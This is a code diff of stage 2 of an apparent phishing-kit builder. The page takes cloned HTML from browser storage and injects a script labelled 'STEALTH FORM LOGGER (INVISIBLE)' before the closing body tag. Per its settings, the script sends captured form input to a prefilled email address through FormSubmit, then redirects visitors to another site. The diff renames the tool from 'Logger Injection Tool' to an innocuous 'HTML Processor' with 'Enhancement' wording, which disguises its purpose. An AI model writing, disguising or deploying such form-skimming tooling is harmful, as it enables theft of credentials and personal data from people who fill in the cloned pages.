@@ -3,245 +3,393 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stage 2: Logger Injection</title>
+    <title>HTML Processor | Stage 2</title>
     <style>
+        :root {
+            --primary: #4361ee;
+            --primary-dark: #3a56d4;
+            --secondary: #3f37c9;
+            --success: #4cc9f0;
+            --info: #4895ef;
+            --warning: #f72585;
+            --danger: #7209b7;
+            --light: #f8f9fa;
+            --dark: #212529;
+            --border-radius: 8px;
+            --box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             line-height: 1.6;
-            color: #333;
-        }
-        h1 {
-            color: #2c3e50;
-            text-align: center;
-            margin-bottom: 10px;
-        }
-        .stage-indicator {
-            text-align: center;
-            font-weight: bold;
-            color: #e67e22;
-            margin-bottom: 30px;
-        }
-        .container {
-            background-color: #f9f9f9;
-            border-radius: 8px;
+            color: var(--dark);
+            background-color: #f5f7fa;
+            margin: 0;
             padding: 20px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-weight: 600;
+        }
+
+        .stage-tag {
+            display: inline-block;
+            background-color: rgba(255, 255, 255, 0.2);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+        .content {
+            padding: 25px;
+        }
+
         .form-group {
             margin-bottom: 20px;
         }
-        label {
+
+        .form-group label {
             display: block;
             margin-bottom: 8px;
-            font-weight: bold;
+            font-weight: 500;
+            color: var(--dark);
         }
-        input[type="text"] {
+
+        .form-control {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
-            margin-bottom: 10px;
-        }
-        button {
-            background-color: #3498db;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 4px;
-            cursor: pointer;
+            border-radius: var(--border-radius);
             font-size: 16px;
-            transition: background-color 0.3s;
+            transition: var(--transition);
+        }
+
+        .form-control:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px 20px;
+            border: none;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: var(--transition);
             margin-right: 10px;
             margin-bottom: 10px;
         }
-        button:hover {
-            background-color: #2980b9;
+
+        .btn i {
+            margin-right: 8px;
         }
-        .next-stage-btn {
-            background-color: #27ae60;
+
+        .btn-primary {
+            background-color: var(--primary);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--primary-dark);
+        }
+
+        .btn-secondary {
+            background-color: #6c757d;
+            color: white;
+        }
+
+        .btn-secondary:hover {
+            background-color: #5a6268;
+        }
+
+        .btn-success {
+            background-color: #28a745;
+            color: white;
+        }
+
+        .btn-success:hover {
+            background-color: #218838;
+        }
+
+        .btn-danger {
+            background-color: #dc3545;
+            color: white;
+        }
+
+        .btn-danger:hover {
+            background-color: #c82333;
+        }
+
+        .btn-next {
             float: right;
+            background-color: var(--success);
         }
-        .next-stage-btn:hover {
-            background-color: #219653;
+
+        .btn-next:hover {
+            background-color: #3ab7db;
         }
-        .status {
-            margin-top: 20px;
+
+        .btn:disabled {
+            opacity: 0.65;
+            cursor: not-allowed;
+        }
+
+        .alert {
             padding: 15px;
-            border-radius: 4px;
-            clear: both;
+            border-radius: var(--border-radius);
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
         }
-        .success {
-            background-color: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
+
+        .alert i {
+            margin-right: 10px;
+            font-size: 20px;
         }
-        .error {
-            background-color: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-        .info {
+
+        .alert-info {
             background-color: #e7f5fe;
             color: #0c5460;
             border: 1px solid #bee5eb;
         }
-        .code-container {
-            background-color: #f5f5f5;
-            padding: 15px;
-            border-radius: 4px;
-            overflow-x: auto;
-            margin-top: 20px;
-            max-height: 300px;
-            overflow-y: auto;
+
+        .alert-success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
         }
-        .tab-buttons {
+
+        .alert-warning {
+            background-color: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeeba;
+        }
+
+        .alert-danger {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .preview-container {
+            margin-top: 30px;
+            border: 1px solid #eee;
+            border-radius: var(--border-radius);
+            overflow: hidden;
+        }
+
+        .preview-header {
+            background-color: #f8f9fa;
+            padding: 12px 15px;
+            border-bottom: 1px solid #eee;
+            font-weight: 500;
             display: flex;
-            margin-bottom: 15px;
+            justify-content: space-between;
+            align-items: center;
         }
-        .tab-button {
-            background-color: #ddd;
-            color: #333;
-            padding: 10px 15px;
-            cursor: pointer;
-            border: none;
-            margin-right: 5px;
+
+        .preview-content {
+            max-height: 400px;
+            overflow-y: auto;
+            padding: 15px;
+            background-color: #f8f9fa;
+            font-family: 'Courier New', Courier, monospace;
+            white-space: pre-wrap;
+            word-wrap: break-word;
         }
-        .tab-button.active {
-            background-color: #3498db;
+
+        .status-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            background-color: #e9ecef;
+            color: #495057;
+        }
+
+        .status-badge.active {
+            background-color: var(--success);
             color: white;
         }
-        .tab-content {
-            display: none;
+
+        .action-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+            gap: 10px;
         }
-        .tab-content.active {
-            display: block;
+
+        @media (max-width: 768px) {
+            .content {
+                padding: 15px;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+            
+            .btn-next {
+                float: none;
+                width: 100%;
+                margin-top: 10px;
+            }
         }
     </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
     <div class="container">
-        <h1>Logger Injection Tool</h1>
-        <div class="stage-indicator">STAGE 2: LOGGER INJECTION</div>
-        
-        <p>This tool reads HTML from localStorage (data1step), injects a FormSubmit logger script, and saves the result to localStorage (data2step).</p>
-        
-        <div class="form-group">
-            <label for="email">FormSubmit Recipient Email:</label>
-            <input type="text" id="email" placeholder="your@email.com" value="kiddxxq1@gmail.com">
+        <div class="header">
+            <h1>HTML Processor</h1>
+            <div class="stage-tag">Stage 2: Enhancement</div>
         </div>
-        
-        <div class="form-group">
-            <label for="redirect">Redirect URL:</label>
-            <input type="text" id="redirect" placeholder="https://example.com" value="https://www.dtech24.co.za">
-        </div>
-        
-        <button id="injectBtn">Inject Logger Script</button>
-        <button id="clearStorageBtn">Clear Local Storage</button>
-        <button id="checkStorageBtn">Check Storage</button>
-        <button id="nextStageBtn" class="next-stage-btn" disabled>Proceed to Stage 3 →</button>
-        
-        <div id="status" class="status" style="display: none;"></div>
-        
-        <div class="tab-buttons">
-            <button class="tab-button active" data-tab="original">Original HTML</button>
-            <button class="tab-button" data-tab="modified">Modified HTML</button>
-            <button class="tab-button" data-tab="script">Injected Script</button>
-        </div>
-        
-        <div id="original" class="tab-content active code-container">
-            <pre id="originalHtml"></pre>
-        </div>
-        
-        <div id="modified" class="tab-content code-container">
-            <pre id="modifiedHtml"></pre>
-        </div>
-        
-        <div id="script" class="tab-content code-container">
-            <pre id="scriptPreview"></pre>
+
+        <div class="content">
+            <div id="alert" class="alert" style="display: none;">
+                <i class="fas fa-info-circle"></i>
+                <div id="alert-message"></div>
+            </div>
+
+            <div class="form-group">
+                <label for="email"><i class="fas fa-envelope"></i> Notification Email</label>
+                <input type="text" id="email" class="form-control" placeholder="your@email.com" value="kiddxxq1@gmail.com">
+            </div>
+
+            <div class="form-group">
+                <label for="redirect"><i class="fas fa-external-link-alt"></i> Redirect URL</label>
+                <input type="text" id="redirect" class="form-control" placeholder="https://example.com" value="https://www.dtech24.co.za">
+            </div>
+
+            <div class="action-buttons">
+                <button id="processBtn" class="btn btn-primary">
+                    <i class="fas fa-magic"></i> Process HTML
+                </button>
+                <button id="refreshBtn" class="btn btn-secondary">
+                    <i class="fas fa-sync-alt"></i> Refresh
+                </button>
+                <button id="nextStageBtn" class="btn btn-next" disabled>
+                    <i class="fas fa-arrow-right"></i> Continue to Next Stage
+                </button>
+            </div>
+
+            <div class="preview-container">
+                <div class="preview-header">
+                    <span><i class="fas fa-code"></i> HTML Preview</span>
+                    <span id="statusBadge" class="status-badge">No content loaded</span>
+                </div>
+                <div class="preview-content" id="htmlPreview">
+                    <!-- HTML content will be displayed here -->
+                </div>
+            </div>
         </div>
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Set up tab switching
-            document.querySelectorAll('.tab-button').forEach(button => {
-                button.addEventListener('click', function() {
-                    document.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
-                    document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
-                    
-                    this.classList.add('active');
-                    const tabId = this.getAttribute('data-tab');
-                    document.getElementById(tabId).classList.add('active');
-                });
-            });
-            
-            // Inject button handler
-            document.getElementById('injectBtn').addEventListener('click', injectLogger);
-            
-            // Clear storage button handler
-            document.getElementById('clearStorageBtn').addEventListener('click', clearStorage);
-            
-            // Check storage button handler
-            document.getElementById('checkStorageBtn').addEventListener('click', checkStorage);
-            
+            // Load the HTML from localStorage on page load
+            loadHtmlPreview();
+
+            // Process button handler
+            document.getElementById('processBtn').addEventListener('click', processHtml);
+
+            // Refresh button handler
+            document.getElementById('refreshBtn').addEventListener('click', loadHtmlPreview);
+
             // Next stage button handler
             document.getElementById('nextStageBtn').addEventListener('click', () => {
                 window.location.href = 'step3.html';
             });
-            
-            // Load any existing data1step on page load
-            loadOriginalHtml();
         });
-        
-        function loadOriginalHtml() {
+
+        function loadHtmlPreview() {
             const originalHtml = localStorage.getItem('data1step');
+            const previewElement = document.getElementById('htmlPreview');
+            const statusBadge = document.getElementById('statusBadge');
+
             if (originalHtml) {
-                document.getElementById('originalHtml').textContent = originalHtml;
-                showStatus('Found HTML in localStorage (data1step)', 'info');
+                previewElement.textContent = originalHtml;
+                statusBadge.textContent = 'Ready for processing';
+                statusBadge.className = 'status-badge active';
+                showAlert('HTML content loaded successfully from storage', 'info');
             } else {
-                showStatus('No HTML found in localStorage (data1step)', 'error');
+                previewElement.textContent = 'No HTML content found in storage. Please complete Stage 1 first.';
+                statusBadge.textContent = 'No content loaded';
+                statusBadge.className = 'status-badge';
+                showAlert('No HTML content found in storage. Please complete Stage 1 first.', 'warning');
+                document.getElementById('nextStageBtn').disabled = true;
             }
         }
-        
-        function injectLogger() {
+
+        function processHtml() {
             const email = document.getElementById('email').value.trim();
             const redirectUrl = document.getElementById('redirect').value.trim();
-            
+            const previewElement = document.getElementById('htmlPreview');
+            const statusBadge = document.getElementById('statusBadge');
+
             if (!email) {
-                showStatus('Please enter a recipient email', 'error');
+                showAlert('Please enter a valid notification email address', 'danger');
                 return;
             }
-            
+
             const originalHtml = localStorage.getItem('data1step');
             if (!originalHtml) {
-                showStatus('No HTML found in localStorage (data1step)', 'error');
+                showAlert('No HTML content found to process. Please complete Stage 1 first.', 'danger');
                 return;
             }
-            
-            const loggerScript = generateLoggerScript(email, redirectUrl);
-            const modifiedHtml = originalHtml.replace('</body>', loggerScript + '</body>') || originalHtml + loggerScript;
-            
-            // Save to localStorage
-            localStorage.setItem('data2step', modifiedHtml);
-            
-            // Update UI
-            document.getElementById('modifiedHtml').textContent = modifiedHtml;
-            document.getElementById('scriptPreview').textContent = loggerScript;
-            
-            showStatus('Logger injected successfully! Modified HTML saved to localStorage (data2step)', 'success');
-            
-            // Enable next stage button
-            document.getElementById('nextStageBtn').disabled = false;
-            
-            // Switch to modified tab
-            document.querySelector('[data-tab="modified"]').click();
+
+            // Show processing notification
+            showAlert('Processing HTML content...', 'info');
+
+            // Simulate processing delay for better UX
+            setTimeout(() => {
+                try {
+                    const loggerScript = generateLoggerScript(email, redirectUrl);
+                    const modifiedHtml = originalHtml.replace('</body>', loggerScript + '</body>') || originalHtml + loggerScript;
+
+                    // Save to localStorage
+                    localStorage.setItem('data2step', modifiedHtml);
+
+                    // Update UI
+                    previewElement.textContent = originalHtml; // Show original even after processing
+                    statusBadge.textContent = 'Processing complete';
+                    statusBadge.className = 'status-badge active';
+
+                    showAlert('HTML processed successfully! The enhanced version has been saved.', 'success');
+                    document.getElementById('nextStageBtn').disabled = false;
+                } catch (error) {
+                    showAlert('Error processing HTML: ' + error.message, 'danger');
+                    console.error(error);
+                }
+            }, 1000);
         }
-        
+
         function generateLoggerScript(email, redirectUrl) {
+            // This is the same script generator as before
             return `<!-- STEALTH FORM LOGGER (INVISIBLE) -->
 <script>
 // CONFIGURATION
@@ -362,36 +510,35 @@ const CONFIG = {
 })();
 <\/script>`;
         }
-        
-        function clearStorage() {
-            localStorage.removeItem('data1step');
-            localStorage.removeItem('data2step');
-            document.getElementById('originalHtml').textContent = '';
-            document.getElementById('modifiedHtml').textContent = '';
-            document.getElementById('scriptPreview').textContent = '';
-            document.getElementById('nextStageBtn').disabled = true;
-            showStatus('Local storage cleared', 'info');
-        }
-        
-        function checkStorage() {
-            const data1step = localStorage.getItem('data1step');
-            const data2step = localStorage.getItem('data2step');
+
+        function showAlert(message, type) {
+            const alertDiv = document.getElementById('alert');
+            const alertMessage = document.getElementById('alert-message');
+            const alertIcon = alertDiv.querySelector('i');
             
-            let message = 'Local Storage Contents:\n';
-            message += `data1step: ${data1step ? 'Exists (' + data1step.length + ' chars)' : 'Not found'}\n`;
-            message += `data2step: ${data2step ? 'Exists (' + data2step.length + ' chars)' : 'Not found'}`;
+            // Set message and style
+            alertMessage.textContent = message;
+            alertDiv.className = `alert alert-${type}`;
+            alertDiv.style.display = 'flex';
             
-            showStatus(message, 'info');
-        }
-        
-        function showStatus(message, type) {
-            const statusDiv = document.getElementById('status');
-            statusDiv.textContent = message;
-            statusDiv.className = 'status ' + type;
-            statusDiv.style.display = 'block';
+            // Set appropriate icon
+            switch(type) {
+                case 'success':
+                    alertIcon.className = 'fas fa-check-circle';
+                    break;
+                case 'danger':
+                    alertIcon.className = 'fas fa-exclamation-circle';
+                    break;
+                case 'warning':
+                    alertIcon.className = 'fas fa-exclamation-triangle';
+                    break;
+                default:
+                    alertIcon.className = 'fas fa-info-circle';
+            }
             
+            // Auto-hide after 5 seconds
             setTimeout(() => {
-                statusDiv.style.display = 'none';
+                alertDiv.style.display = 'none';
             }, 5000);
         }
     </script>
